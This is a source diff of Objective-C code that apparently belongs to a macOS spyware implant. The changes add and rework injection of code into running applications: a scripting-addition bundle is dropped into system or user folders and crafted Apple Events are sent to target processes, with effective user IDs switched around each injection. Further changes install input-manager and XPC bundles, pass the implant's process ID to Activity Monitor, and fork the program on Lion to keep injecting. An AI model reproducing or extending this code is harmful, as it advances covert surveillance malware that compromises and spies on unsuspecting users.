@@ -173,6 +173,64 @@ static void computerWillShutdown(CFMachPortRef port,
     }
 }
 
+void lionSendEventToPid(pid_t pidP)
+{
+  AEEventID eventID = 'load';
+  int rUid = getuid();
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"send event to application pid %d", pidP);
+#endif
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"enter critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  // trimming process u&g
+  seteuid(rUid);
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+	
+  [app sendEvent: kASAppleScriptSuite
+              id: kGetAEUT
+      parameters: 0];
+  
+  sleep(1);
+  
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
+  
+  NSNumber *pid = [NSNumber numberWithInt: getpid()];
+  
+  id injectReply = [app sendEvent: 'RCSe'
+                               id: eventID
+                       parameters: 'pido', pid, 0];
+  
+#ifdef DEBUG_CORE
+  verboseLog(@"exit critical session [euid/uid %d/%d]", 
+             geteuid(), getuid());
+#endif
+  
+  if (injectReply != nil) 
+  {
+#ifdef DEBUG_CORE	
+    warnLog(@"unexpected injectReply: %@", injectReply);
+#endif
+  }
+  else 
+  {
+#ifdef DEBUG_CORE
+    verboseLog(@"injection done");
+#endif
+  }
+  
+  [pool release];  
+}
+
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
@@ -2202,14 +2260,33 @@ static void computerWillShutdown(CFMachPortRef port,
 - (void)_dropOsaxBundle
 {
   NSString *osaxRootPath = nil;
+  NSString *osaxUserPath = nil;
   
   if (getuid() == 0 || geteuid() == 0) 
-    osaxRootPath = [[NSString alloc] initWithFormat: @"%@",
+  {
+    osaxRootPath = [[NSString alloc] initWithFormat: @"/%@",
                     OSAX_ROOT_PATH];
+    
+    // i'm root: remove old low privs osax from user folders
+    NSString *osaxLowPrivsPath = [[NSString alloc]
+                                  initWithFormat: @"/Users/%@/%@/%@",
+                                  NSUserName(),
+                                  OSAX_ROOT_PATH,
+                                  EXT_BUNDLE_FOLDER];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: osaxLowPrivsPath
+                                                 error: nil];
+    }
+    
+  }
   else
+  {
     osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
                     NSUserName(),
                     OSAX_ROOT_PATH];
+  }
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
   {
@@ -2219,16 +2296,26 @@ static void computerWillShutdown(CFMachPortRef port,
                                                     error: nil];
   }
   
+#ifdef DEBUG_CORE
+  infoLog(@"osaxRootPath %@", osaxRootPath);
+#endif
+  
   NSMutableString *osaxPath = [[NSMutableString alloc]
                                initWithFormat: @"%@/%@",
                                osaxRootPath,
                                EXT_BUNDLE_FOLDER];
   
+  
+  
+#ifdef DEBUG_CORE
+  infoLog(@"osaxPath %@", osaxPath);
+#endif
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
-    {
+  {
       [[NSFileManager defaultManager] removeItemAtPath: osaxPath
                                                  error: nil];
-    }
+  }
   
   //
   // Scripting folder
@@ -3153,42 +3240,38 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"mExecFlag exists");
 #endif
       [self _createInternalFilesAndFolders];
-      
-      if (getuid() == 0 || geteuid() == 0)
+
+      //
+      // Now it's time for all the Info.plist mess
+      // we need to create the fs hierarchy for the input manager and kext
+      //
+      if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
         {
-          //
-          // Now it's time for all the Info.plist mess
-          // we need to create the fs hierarchy for the input manager and kext
-          //
-          if ([gUtil isLeopard])
+#ifdef DEBUG_CORE
+          infoLog(@"Dropping input manager");
+#endif
+          if ([self _dropInputManager] == NO)
             {
 #ifdef DEBUG_CORE
-              infoLog(@"Dropping input manager");
+              errorLog(@"Error while installing input manager");
 #endif
-              if ([self _dropInputManager] == NO)
-                {
-#ifdef DEBUG_CORE
-                  errorLog(@"Error while installing input manager");
-#endif
-                }
             }
-          else
-            {
+        }
+      else
+        {
 #ifdef DEBUG_CORE
-              infoLog(@"Dropping OSAX");
+          infoLog(@"Dropping OSAX");
 #endif
-              [self _dropOsaxBundle];
-              
-              // Drop xpc services for sandboxed app
-              if ([gUtil isLion])
-              {
+          [self _dropOsaxBundle];
+          
+          // Drop xpc services for sandboxed app
+          if ([gUtil isLion] && (getuid() == 0 || geteuid() == 0))
+          {
 #ifdef DEBUG_CORE
-                infoLog(@"im on lion dropping XPC service");
+            infoLog(@"im on lion dropping XPC service");
 #endif
-                [self _dropXPCBundle];
-              }
-                
-            }
+            [self _dropXPCBundle];
+          }
         }
     }
   
@@ -3407,6 +3490,35 @@ static void computerWillShutdown(CFMachPortRef port,
   int maxRetry = 10;
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // On lion fork to sendEvents without problem
+  if ([gUtil isLion]) 
+  {
+    NSTask *aTask = [[NSTask alloc] init];
+    NSMutableArray *args = [NSMutableArray array];
+    NSString *pidStr = [[NSString alloc] initWithFormat: @"%d", [thePid intValue]];
+    
+    /* set arguments */
+    [args addObject:[[[NSBundle mainBundle] executablePath] lastPathComponent]];
+    [args addObject: @"-p"];
+    [args addObject: pidStr];
+    [aTask setLaunchPath: [[NSBundle mainBundle] executablePath]];
+    [aTask setArguments:args];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"Running task with args %@", args);
+#endif
+    
+    [aTask launch];
+    [aTask release];
+    [pidStr release];
+    
+#ifdef DEBUG_CORE
+    verboseLog(@"task launched");
+#endif
+    return;
+  }
+  
   RCSMTaskManager *_taskManager = [RCSMTaskManager sharedInstance];
   
   [gControlFlagLock lock];
@@ -3426,7 +3538,7 @@ static void computerWillShutdown(CFMachPortRef port,
   verboseLog(@"send event to application pid %d", pidP);
 #endif
   
-  [app setDelegate: self];
+  //[app setDelegate: self];
   
   [gSuidLock lock];
   
@@ -3436,7 +3548,8 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
   
   // trimming process u&g
-  seteuid(rUid);
+  if (eUid != rUid)
+    seteuid(rUid);
   
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
 	
@@ -3455,7 +3568,7 @@ static void computerWillShutdown(CFMachPortRef port,
                        parameters: 'pido', pid, 0];
   
   // Check if the seteuid do the correct work...
-  while ((geteuid() != eUid) && maxRetry) 
+  while ((geteuid() != eUid) && maxRetry--) 
     {
       // original u&g
       if (seteuid(eUid) == -1)
@@ -3491,7 +3604,7 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [thePid release];
   
-  [pool release];
+  [pool release];  
 }
 
 - (BOOL)isCrisisHookApp: (NSString*)appName
@@ -3575,31 +3688,30 @@ static void computerWillShutdown(CFMachPortRef port,
     return;
   }
   
-  if (getuid() == 0 || geteuid() == 0)
+
+  if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
     {
 #ifdef DEBUG_CORE
       infoLog(@"im root!");
 #endif
-      if ([gUtil isLeopard])
+      // Only for leopard send pid to new activity monitor via shmem
+      if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
         {
-          // Only for leopard send pid to new activity monitor via shmem
-          if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
-            {
-              // Write command with pid
-              [self shareCorePidOnShMem];
-            }
-        }
-      else
-        {
-#ifdef DEBUG_CORE
-          infoLog(@" im root: sendEventToPid");
-#endif
-          // temporary thread for fixing euid/uid escalation
-          [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
-                                   toTarget: self 
-                                 withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+          // Write command with pid
+          [self shareCorePidOnShMem];
         }
     }
+  else
+    {
+#ifdef DEBUG_CORE
+      infoLog(@"sendEventToPid");
+#endif
+      // temporary thread for fixing euid/uid escalation
+      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
+                               toTarget: self 
+                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+    }
+    
   
   [pool release];
 }
